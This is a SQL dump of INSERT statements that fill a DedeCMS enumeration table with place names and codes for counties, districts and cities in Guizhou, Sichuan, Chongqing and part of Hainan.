INSERT INTO dede_sys_enum VALUES ('19311', '习水县', '12503.12', 'nativeplace', '12503', '2');
INSERT INTO dede_sys_enum VALUES ('19310', '余庆县', '12503.11', 'nativeplace', '12503', '2');
INSERT INTO dede_sys_enum VALUES ('19309', '湄潭县', '12503.10', 'nativeplace', '12503', '2');
INSERT INTO dede_sys_enum VALUES ('19308', '凤冈县', '12503.9', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19307', '务川仡佬族苗族自治县', '12503.8', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19306', '道真仡佬族苗族自治县', '12503.7', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19305', '正安县', '12503.6', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19304', '绥阳县', '12503.5', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19303', '桐梓县', '12503.4', 'nativeplace', '12503', '2');
INSERT INTO dede_sys_enum VALUES ('19302', '遵义县', '12503.3', 'nativeplace', '12503', '2');
INSERT INTO dede_sys_enum VALUES ('19301', '汇川区', '12503.2', 'nativeplace', '12503', '2');
INSERT INTO dede_sys_enum VALUES ('19300', '红花岗区', '12503.1', 'nativeplace', '12503', '2');
INSERT INTO dede_sys_enum VALUES ('19299', '遵义市', '12503', 'nativeplace', '12503', '1');
INSERT INTO dede_sys_enum VALUES ('19298', '盘　县', '12502.4', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19297', '水城县', '12502.3', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19296', '六枝特区', '12502.2', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19295', '钟山区', '12502.1', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19294', '六盘水市', '12502', 'nativeplace', '12502', '1');
INSERT INTO dede_sys_enum VALUES ('19293', '清镇市', '12501.10', 'nativeplace', '12501', '2');
INSERT INTO dede_sys_enum VALUES ('19292', '修文县', '12501.9', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19291', '息烽县', '12501.8', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19290', '开阳县', '12501.7', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19289', '小河区', '12501.6', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19288', '白云区', '12501.5', 'nativeplace', '12502', '2');
INSERT INTO dede_sys_enum VALUES ('19287', '乌当区', '12501.4', 'nativeplace', '12501', '2');
INSERT INTO dede_sys_enum VALUES ('19286', '花溪区', '12501.3', 'nativeplace', '12501', '2');
INSERT INTO dede_sys_enum VALUES ('19285', '云岩区', '12501.2', 'nativeplace', '12501', '2');
INSERT INTO dede_sys_enum VALUES ('19284', '南明区', '12501.1', 'nativeplace', '12501', '2');
INSERT INTO dede_sys_enum VALUES ('19283', '贵阳市', '12501', 'nativeplace', '12501', '1');
INSERT INTO dede_sys_enum VALUES ('19282', '贵州省', '12500', 'nativeplace', '12500', '0');
INSERT INTO dede_sys_enum VALUES ('19281', '雷波县', '12021.17', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19280', '美姑县', '12021.16', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19279', '甘洛县', '12021.15', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19278', '越西县', '12021.14', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19277', '冕宁县', '12021.13', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19276', '喜德县', '12021.12', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19275', '昭觉县', '12021.11', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19274', '金阳县', '12021.10', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19273', '布拖县', '12021.9', 'nativeplace', '12022', '2');
INSERT INTO dede_sys_enum VALUES ('19272', '普格县', '12021.8', 'nativeplace', '12022', '2');
INSERT INTO dede_sys_enum VALUES ('19271', '宁南县', '12021.7', 'nativeplace', '12022', '2');
INSERT INTO dede_sys_enum VALUES ('19270', '会东县', '12021.6', 'nativeplace', '12022', '2');
INSERT INTO dede_sys_enum VALUES ('19269', '会理县', '12021.5', 'nativeplace', '12022', '2');
INSERT INTO dede_sys_enum VALUES ('19268', '德昌县', '12021.4', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19267', '盐源县', '12021.3', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19266', '木里藏族自治县', '12021.2', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19265', '西昌市', '12021.1', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19264', '凉山彝族自治州', '12021', 'nativeplace', '12021', '1');
INSERT INTO dede_sys_enum VALUES ('19263', '得荣县', '12020.18', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19262', '稻城县', '12020.17', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19261', '乡城县', '12020.16', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19260', '巴塘县', '12020.15', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19259', '理塘县', '12020.14', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19258', '色达县', '12020.13', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19257', '石渠县', '12020.12', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19256', '白玉县', '12020.11', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19255', '德格县', '12020.10', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19254', '新龙县', '12020.9', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19253', '甘孜县', '12020.8', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19252', '炉霍县', '12020.7', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19251', '道孚县', '12020.6', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19250', '雅江县', '12020.5', 'nativeplace', '12021', '2');
INSERT INTO dede_sys_enum VALUES ('19249', '九龙县', '12020.4', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19248', '丹巴县', '12020.3', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19247', '泸定县', '12020.2', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19246', '康定县', '12020.1', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19245', '甘孜藏族自治州', '12020', 'nativeplace', '12020', '1');
INSERT INTO dede_sys_enum VALUES ('19244', '红原县', '12019.13', 'nativeplace', '12019', '2');
INSERT INTO dede_sys_enum VALUES ('19243', '若尔盖县', '12019.12', 'nativeplace', '12019', '2');
INSERT INTO dede_sys_enum VALUES ('19242', '阿坝县', '12019.11', 'nativeplace', '12019', '2');
INSERT INTO dede_sys_enum VALUES ('19241', '壤塘县', '12019.10', 'nativeplace', '12019', '2');
INSERT INTO dede_sys_enum VALUES ('19240', '马尔康县', '12019.9', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19239', '黑水县', '12019.8', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19238', '小金县', '12019.7', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19237', '金川县', '12019.6', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19236', '九寨沟县', '12019.5', 'nativeplace', '12020', '2');
INSERT INTO dede_sys_enum VALUES ('19235', '松潘县', '12019.4', 'nativeplace', '12019', '2');
INSERT INTO dede_sys_enum VALUES ('19234', '茂　县', '12019.3', 'nativeplace', '12019', '2');
INSERT INTO dede_sys_enum VALUES ('19233', '理　县', '12019.2', 'nativeplace', '12019', '2');
INSERT INTO dede_sys_enum VALUES ('19232', '汶川县', '12019.1', 'nativeplace', '12019', '2');
INSERT INTO dede_sys_enum VALUES ('19231', '阿坝藏族羌族自治州', '12019', 'nativeplace', '12019', '1');
INSERT INTO dede_sys_enum VALUES ('19230', '简阳市', '12018.4', 'nativeplace', '12018', '2');
INSERT INTO dede_sys_enum VALUES ('19229', '乐至县', '12018.3', 'nativeplace', '12018', '2');
INSERT INTO dede_sys_enum VALUES ('19228', '安岳县', '12018.2', 'nativeplace', '12018', '2');
INSERT INTO dede_sys_enum VALUES ('19227', '雁江区', '12018.1', 'nativeplace', '12018', '2');
INSERT INTO dede_sys_enum VALUES ('19226', '资阳市', '12018', 'nativeplace', '12018', '1');
INSERT INTO dede_sys_enum VALUES ('19225', '平昌县', '12017.4', 'nativeplace', '12017', '2');
INSERT INTO dede_sys_enum VALUES ('19224', '南江县', '12017.3', 'nativeplace', '12017', '2');
INSERT INTO dede_sys_enum VALUES ('19223', '通江县', '12017.2', 'nativeplace', '12017', '2');
INSERT INTO dede_sys_enum VALUES ('19222', '巴州区', '12017.1', 'nativeplace', '12017', '2');
INSERT INTO dede_sys_enum VALUES ('19221', '巴中市', '12017', 'nativeplace', '12017', '1');
INSERT INTO dede_sys_enum VALUES ('19220', '宝兴县', '12016.8', 'nativeplace', '12017', '2');
INSERT INTO dede_sys_enum VALUES ('19219', '芦山县', '12016.7', 'nativeplace', '12017', '2');
INSERT INTO dede_sys_enum VALUES ('19218', '天全县', '12016.6', 'nativeplace', '12017', '2');
INSERT INTO dede_sys_enum VALUES ('19217', '石棉县', '12016.5', 'nativeplace', '12017', '2');
INSERT INTO dede_sys_enum VALUES ('19216', '汉源县', '12016.4', 'nativeplace', '12016', '2');
INSERT INTO dede_sys_enum VALUES ('19215', '荥经县', '12016.3', 'nativeplace', '12016', '2');
INSERT INTO dede_sys_enum VALUES ('19214', '名山县', '12016.2', 'nativeplace', '12016', '2');
INSERT INTO dede_sys_enum VALUES ('19213', '雨城区', '12016.1', 'nativeplace', '12016', '2');
INSERT INTO dede_sys_enum VALUES ('19212', '雅安市', '12016', 'nativeplace', '12016', '1');
INSERT INTO dede_sys_enum VALUES ('19211', '万源市', '12015.7', 'nativeplace', '12016', '2');
INSERT INTO dede_sys_enum VALUES ('19210', '渠　县', '12015.6', 'nativeplace', '12016', '2');
INSERT INTO dede_sys_enum VALUES ('19209', '大竹县', '12015.5', 'nativeplace', '12016', '2');
INSERT INTO dede_sys_enum VALUES ('19208', '开江县', '12015.4', 'nativeplace', '12015', '2');
INSERT INTO dede_sys_enum VALUES ('19207', '宣汉县', '12015.3', 'nativeplace', '12015', '2');
INSERT INTO dede_sys_enum VALUES ('19206', '达　县', '12015.2', 'nativeplace', '12015', '2');
INSERT INTO dede_sys_enum VALUES ('19205', '通川区', '12015.1', 'nativeplace', '12015', '2');
INSERT INTO dede_sys_enum VALUES ('19204', '达州市', '12015', 'nativeplace', '12015', '1');
INSERT INTO dede_sys_enum VALUES ('19203', '华莹市', '12014.5', 'nativeplace', '12015', '2');
INSERT INTO dede_sys_enum VALUES ('19202', '邻水县', '12014.4', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19201', '武胜县', '12014.3', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19200', '岳池县', '12014.2', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19199', '广安区', '12014.1', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19198', '广安市', '12014', 'nativeplace', '12014', '1');
INSERT INTO dede_sys_enum VALUES ('19197', '屏山县', '12013.10', 'nativeplace', '12013', '2');
INSERT INTO dede_sys_enum VALUES ('19196', '兴文县', '12013.9', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19195', '筠连县', '12013.8', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19194', '珙　县', '12013.7', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19193', '高　县', '12013.6', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19192', '长宁县', '12013.5', 'nativeplace', '12014', '2');
INSERT INTO dede_sys_enum VALUES ('19191', '江安县', '12013.4', 'nativeplace', '12013', '2');
INSERT INTO dede_sys_enum VALUES ('19190', '南溪县', '12013.3', 'nativeplace', '12013', '2');
INSERT INTO dede_sys_enum VALUES ('19189', '宜宾县', '12013.2', 'nativeplace', '12013', '2');
INSERT INTO dede_sys_enum VALUES ('19188', '翠屏区', '12013.1', 'nativeplace', '12013', '2');
INSERT INTO dede_sys_enum VALUES ('19187', '宜宾市', '12013', 'nativeplace', '12013', '1');
INSERT INTO dede_sys_enum VALUES ('19186', '青神县', '12012.6', 'nativeplace', '12013', '2');
INSERT INTO dede_sys_enum VALUES ('19185', '丹棱县', '12012.5', 'nativeplace', '12013', '2');
INSERT INTO dede_sys_enum VALUES ('19184', '洪雅县', '12012.4', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19183', '彭山县', '12012.3', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19182', '仁寿县', '12012.2', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19181', '东坡区', '12012.1', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19180', '眉山市', '12012', 'nativeplace', '12012', '1');
INSERT INTO dede_sys_enum VALUES ('19179', '阆中市', '12011.9', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19178', '西充县', '12011.8', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19177', '仪陇县', '12011.7', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19176', '蓬安县', '12011.6', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19175', '营山县', '12011.5', 'nativeplace', '12012', '2');
INSERT INTO dede_sys_enum VALUES ('19174', '南部县', '12011.4', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19173', '嘉陵区', '12011.3', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19172', '高坪区', '12011.2', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19171', '顺庆区', '12011.1', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19170', '南充市', '12011', 'nativeplace', '12011', '1');
INSERT INTO dede_sys_enum VALUES ('19169', '峨眉山市', '12010.11', 'nativeplace', '12010', '2');
INSERT INTO dede_sys_enum VALUES ('19168', '马边彝族自治县', '12010.10', 'nativeplace', '12010', '2');
INSERT INTO dede_sys_enum VALUES ('19167', '峨边彝族自治县', '12010.9', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19166', '沐川县', '12010.8', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19165', '夹江县', '12010.7', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19164', '井研县', '12010.6', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19163', '犍为县', '12010.5', 'nativeplace', '12011', '2');
INSERT INTO dede_sys_enum VALUES ('19162', '金口河区', '12010.4', 'nativeplace', '12010', '2');
INSERT INTO dede_sys_enum VALUES ('19161', '五通桥区', '12010.3', 'nativeplace', '12010', '2');
INSERT INTO dede_sys_enum VALUES ('19160', '沙湾区', '12010.2', 'nativeplace', '12010', '2');
INSERT INTO dede_sys_enum VALUES ('19159', '市中区', '12010.1', 'nativeplace', '12010', '2');
INSERT INTO dede_sys_enum VALUES ('19158', '乐山市', '12010', 'nativeplace', '12010', '1');
INSERT INTO dede_sys_enum VALUES ('19157', '隆昌县', '12009.5', 'nativeplace', '12010', '2');
INSERT INTO dede_sys_enum VALUES ('19156', '资中县', '12009.4', 'nativeplace', '12009', '2');
INSERT INTO dede_sys_enum VALUES ('19155', '威远县', '12009.3', 'nativeplace', '12009', '2');
INSERT INTO dede_sys_enum VALUES ('19154', '东兴区', '12009.2', 'nativeplace', '12009', '2');
INSERT INTO dede_sys_enum VALUES ('19153', '市中区', '12009.1', 'nativeplace', '12009', '2');
INSERT INTO dede_sys_enum VALUES ('19152', '内江市', '12009', 'nativeplace', '12009', '1');
INSERT INTO dede_sys_enum VALUES ('19151', '大英县', '12008.5', 'nativeplace', '12009', '2');
INSERT INTO dede_sys_enum VALUES ('19150', '射洪县', '12008.4', 'nativeplace', '12008', '2');
INSERT INTO dede_sys_enum VALUES ('19149', '蓬溪县', '12008.3', 'nativeplace', '12008', '2');
INSERT INTO dede_sys_enum VALUES ('19148', '安居区', '12008.2', 'nativeplace', '12008', '2');
INSERT INTO dede_sys_enum VALUES ('19147', '船山区', '12008.1', 'nativeplace', '12008', '2');
INSERT INTO dede_sys_enum VALUES ('19146', '遂宁市', '12008', 'nativeplace', '12008', '1');
INSERT INTO dede_sys_enum VALUES ('19145', '苍溪县', '12007.7', 'nativeplace', '12008', '2');
INSERT INTO dede_sys_enum VALUES ('19144', '剑阁县', '12007.6', 'nativeplace', '12008', '2');
INSERT INTO dede_sys_enum VALUES ('19143', '青川县', '12007.5', 'nativeplace', '12008', '2');
INSERT INTO dede_sys_enum VALUES ('19142', '旺苍县', '12007.4', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19141', '朝天区', '12007.3', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19140', '元坝区', '12007.2', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19139', '市中区', '12007.1', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19138', '广元市', '12007', 'nativeplace', '12007', '1');
INSERT INTO dede_sys_enum VALUES ('19137', '江油市', '12006.9', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19136', '平武县', '12006.8', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19135', '北川羌族自治县', '12006.7', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19134', '梓潼县', '12006.6', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19133', '安　县', '12006.5', 'nativeplace', '12007', '2');
INSERT INTO dede_sys_enum VALUES ('19132', '盐亭县', '12006.4', 'nativeplace', '12006', '2');
INSERT INTO dede_sys_enum VALUES ('19131', '三台县', '12006.3', 'nativeplace', '12006', '2');
INSERT INTO dede_sys_enum VALUES ('19130', '游仙区', '12006.2', 'nativeplace', '12006', '2');
INSERT INTO dede_sys_enum VALUES ('19129', '涪城区', '12006.1', 'nativeplace', '12006', '2');
INSERT INTO dede_sys_enum VALUES ('19128', '绵阳市', '12006', 'nativeplace', '12006', '1');
INSERT INTO dede_sys_enum VALUES ('19127', '绵竹市', '12005.6', 'nativeplace', '12006', '2');
INSERT INTO dede_sys_enum VALUES ('19126', '什邡市', '12005.5', 'nativeplace', '12006', '2');
INSERT INTO dede_sys_enum VALUES ('19125', '广汉市', '12005.4', 'nativeplace', '12005', '2');
INSERT INTO dede_sys_enum VALUES ('19124', '罗江县', '12005.3', 'nativeplace', '12005', '2');
INSERT INTO dede_sys_enum VALUES ('19123', '中江县', '12005.2', 'nativeplace', '12005', '2');
INSERT INTO dede_sys_enum VALUES ('19122', '旌阳区', '12005.1', 'nativeplace', '12005', '2');
INSERT INTO dede_sys_enum VALUES ('19121', '德阳市', '12005', 'nativeplace', '12005', '1');
INSERT INTO dede_sys_enum VALUES ('19120', '古蔺县', '12004.7', 'nativeplace', '12005', '2');
INSERT INTO dede_sys_enum VALUES ('19119', '叙永县', '12004.6', 'nativeplace', '12005', '2');
INSERT INTO dede_sys_enum VALUES ('19118', '合江县', '12004.5', 'nativeplace', '12005', '2');
INSERT INTO dede_sys_enum VALUES ('19117', '泸　县', '12004.4', 'nativeplace', '12004', '2');
INSERT INTO dede_sys_enum VALUES ('19116', '龙马潭区', '12004.3', 'nativeplace', '12004', '2');
INSERT INTO dede_sys_enum VALUES ('19115', '纳溪区', '12004.2', 'nativeplace', '12004', '2');
INSERT INTO dede_sys_enum VALUES ('19114', '江阳区', '12004.1', 'nativeplace', '12004', '2');
INSERT INTO dede_sys_enum VALUES ('19113', '泸州市', '12004', 'nativeplace', '12004', '1');
INSERT INTO dede_sys_enum VALUES ('19112', '盐边县', '12003.5', 'nativeplace', '12004', '2');
INSERT INTO dede_sys_enum VALUES ('19111', '米易县', '12003.4', 'nativeplace', '12003', '2');
INSERT INTO dede_sys_enum VALUES ('19110', '仁和区', '12003.3', 'nativeplace', '12003', '2');
INSERT INTO dede_sys_enum VALUES ('19109', '西　区', '12003.2', 'nativeplace', '12003', '2');
INSERT INTO dede_sys_enum VALUES ('19108', '东　区', '12003.1', 'nativeplace', '12003', '2');
INSERT INTO dede_sys_enum VALUES ('19107', '攀枝花市', '12003', 'nativeplace', '12003', '1');
INSERT INTO dede_sys_enum VALUES ('19106', '富顺县', '12002.6', 'nativeplace', '12003', '2');
INSERT INTO dede_sys_enum VALUES ('19105', '荣　县', '12002.5', 'nativeplace', '12003', '2');
INSERT INTO dede_sys_enum VALUES ('19104', '沿滩区', '12002.4', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19103', '大安区', '12002.3', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19102', '贡井区', '12002.2', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19101', '自流井区', '12002.1', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19100', '自贡市', '12002', 'nativeplace', '12002', '1');
INSERT INTO dede_sys_enum VALUES ('19099', '崇州市', '12001.19', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19098', '邛崃市', '12001.18', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19097', '彭州市', '12001.17', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19096', '都江堰市', '12001.16', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19095', '新津县', '12001.15', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19094', '蒲江县', '12001.14', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19093', '大邑县', '12001.13', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19092', '郫　县', '12001.12', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19091', '双流县', '12001.11', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19090', '金堂县', '12001.10', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19089', '温江区', '12001.9', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19088', '新都区', '12001.8', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19087', '青白江区', '12001.7', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19086', '龙泉驿区', '12001.6', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19085', '成华区', '12001.5', 'nativeplace', '12002', '2');
INSERT INTO dede_sys_enum VALUES ('19084', '武侯区', '12001.4', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19083', '金牛区', '12001.3', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19082', '青羊区', '12001.2', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19081', '锦江区', '12001.1', 'nativeplace', '12001', '2');
INSERT INTO dede_sys_enum VALUES ('19080', '成都市', '12001', 'nativeplace', '12001', '1');
INSERT INTO dede_sys_enum VALUES ('19079', '四川省', '12000', 'nativeplace', '12000', '0');
INSERT INTO dede_sys_enum VALUES ('19078', '南川市', '11540', 'nativeplace', '11540', '1');
INSERT INTO dede_sys_enum VALUES ('19077', '永川市', '11539', 'nativeplace', '11539', '1');
INSERT INTO dede_sys_enum VALUES ('19076', '合川市', '11538', 'nativeplace', '11538', '1');
INSERT INTO dede_sys_enum VALUES ('19075', '江津市', '11537', 'nativeplace', '11537', '1');
INSERT INTO dede_sys_enum VALUES ('19074', '彭水苗族土家族自治县', '11536', 'nativeplace', '11536', '1');
INSERT INTO dede_sys_enum VALUES ('19073', '酉阳土家族苗族自治县', '11535', 'nativeplace', '11535', '1');
INSERT INTO dede_sys_enum VALUES ('19072', '秀山土家族苗族自治县', '11534', 'nativeplace', '11534', '1');
INSERT INTO dede_sys_enum VALUES ('19071', '石柱土家族自治县', '11533', 'nativeplace', '11533', '1');
INSERT INTO dede_sys_enum VALUES ('19070', '巫溪县', '11532', 'nativeplace', '11532', '1');
INSERT INTO dede_sys_enum VALUES ('19069', '巫山县', '11531', 'nativeplace', '11531', '1');
INSERT INTO dede_sys_enum VALUES ('19068', '奉节县', '11530', 'nativeplace', '11530', '1');
INSERT INTO dede_sys_enum VALUES ('19067', '云阳县', '11529', 'nativeplace', '11529', '1');
INSERT INTO dede_sys_enum VALUES ('19066', '开　县', '11528', 'nativeplace', '11528', '1');
INSERT INTO dede_sys_enum VALUES ('19065', '忠　县', '11527', 'nativeplace', '11527', '1');
INSERT INTO dede_sys_enum VALUES ('19064', '武隆县', '11526', 'nativeplace', '11526', '1');
INSERT INTO dede_sys_enum VALUES ('19063', '垫江县', '11525', 'nativeplace', '11525', '1');
INSERT INTO dede_sys_enum VALUES ('19062', '丰都县', '11524', 'nativeplace', '11524', '1');
INSERT INTO dede_sys_enum VALUES ('19061', '城口县', '11523', 'nativeplace', '11523', '1');
INSERT INTO dede_sys_enum VALUES ('19060', '梁平县', '11522', 'nativeplace', '11522', '1');
INSERT INTO dede_sys_enum VALUES ('19059', '璧山县', '11521', 'nativeplace', '11521', '1');
INSERT INTO dede_sys_enum VALUES ('19058', '荣昌县', '11520', 'nativeplace', '11520', '1');
INSERT INTO dede_sys_enum VALUES ('19057', '大足县', '11519', 'nativeplace', '11519', '1');
INSERT INTO dede_sys_enum VALUES ('19056', '铜梁县', '11518', 'nativeplace', '11518', '1');
INSERT INTO dede_sys_enum VALUES ('19055', '潼南县', '11517', 'nativeplace', '11517', '1');
INSERT INTO dede_sys_enum VALUES ('19054', '綦江县', '11516', 'nativeplace', '11516', '1');
INSERT INTO dede_sys_enum VALUES ('19053', '长寿区', '11515', 'nativeplace', '11515', '1');
INSERT INTO dede_sys_enum VALUES ('19052', '黔江区', '11514', 'nativeplace', '11514', '1');
INSERT INTO dede_sys_enum VALUES ('19051', '巴南区', '11513', 'nativeplace', '11513', '1');
INSERT INTO dede_sys_enum VALUES ('19050', '渝北区', '11512', 'nativeplace', '11512', '1');
INSERT INTO dede_sys_enum VALUES ('19049', '双桥区', '11511', 'nativeplace', '11511', '1');
INSERT INTO dede_sys_enum VALUES ('19048', '万盛区', '11510', 'nativeplace', '11510', '1');
INSERT INTO dede_sys_enum VALUES ('19047', '北碚区', '11509', 'nativeplace', '11509', '1');
INSERT INTO dede_sys_enum VALUES ('19046', '南岸区', '11508', 'nativeplace', '11508', '1');
INSERT INTO dede_sys_enum VALUES ('19045', '九龙坡区', '11507', 'nativeplace', '11507', '1');
INSERT INTO dede_sys_enum VALUES ('19044', '沙坪坝区', '11506', 'nativeplace', '11506', '1');
INSERT INTO dede_sys_enum VALUES ('19043', '江北区', '11505', 'nativeplace', '11505', '1');
INSERT INTO dede_sys_enum VALUES ('19042', '大渡口区', '11504', 'nativeplace', '11504', '1');
INSERT INTO dede_sys_enum VALUES ('19041', '渝中区', '11503', 'nativeplace', '11503', '1');
INSERT INTO dede_sys_enum VALUES ('19040', '涪陵区', '11502', 'nativeplace', '11502', '1');
INSERT INTO dede_sys_enum VALUES ('19039', '万州区', '11501', 'nativeplace', '11501', '1');
INSERT INTO dede_sys_enum VALUES ('19038', '重庆市', '11500', 'nativeplace', '11500', '0');
INSERT INTO dede_sys_enum VALUES ('19037', '中沙群岛的岛礁及其海域', '11003.19', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19036', '南沙群岛', '11003.18', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19035', '西沙群岛', '11003.17', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19034', '琼中黎族苗族自治县', '11003.16', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19033', '保亭黎族苗族自治县', '11003.15', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19032', '陵水黎族自治县', '11003.14', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19031', '乐东黎族自治县', '11003.13', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19030', '昌江黎族自治县', '11003.12', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19029', '白沙黎族自治县', '11003.11', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19028', '临高县', '11003.10', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19027', '澄迈县', '11003.9', 'nativeplace', '11004', '2');
INSERT INTO dede_sys_enum VALUES ('19026', '屯昌县', '11003.8', 'nativeplace', '11004', '2');
INSERT INTO dede_sys_enum VALUES ('19025', '定安县', '11003.7', 'nativeplace', '11004', '2');
INSERT INTO dede_sys_enum VALUES ('19024', '东方市', '11003.6', 'nativeplace', '11004', '2');
